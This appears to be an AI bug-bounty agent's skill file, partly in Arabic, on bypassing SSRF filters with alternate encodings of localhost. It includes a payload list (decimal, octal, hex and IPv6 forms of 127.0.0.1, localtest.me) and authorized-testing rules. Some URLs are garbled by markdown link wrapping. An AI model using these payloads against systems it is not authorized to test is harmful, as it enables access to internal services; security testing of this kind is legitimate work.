# SKILL: SSRF Bypass — قائمة عناوين [localhost](http://localhost) بديلة

**Skill id:** `tip/ssrf-bypass-قائمة-عناوين-localhosthttplocalhost-بديلة`  
**Category:** SSRF  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dcdac31e88081e99534cf51001f8df4  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **SSRF**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

فلاتر الـ SSRF غالبًا بتتحقق من string مطابق تمامًا لـ "127.0.0.1" أو "[localhost](http://localhost)"، لكن كل الصيغ دي (decimal, octal, hex, IPv6) بترجع لنفس العنوان فعليًا وبتتخطى الفلتر البسيط.

## Payload / Code

```
[http://localhost](http://localhost)
[http://127.1](http://127.1)
[http://127.0.0.0](http://127.0.0.0)
[http://127.0.0.1](http://127.0.0.1)
[http://2130706433](http://2130706433)
[http://0177.1](http://0177.1)
[http://0x7f.1](http://0x7f.1)
[http://127.000.000.1](http://127.000.000.1)
[http://localtest.me](http://localtest.me)
http://\[::1\]
http://\[::\]
```

## Source

Anton @thercem an

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
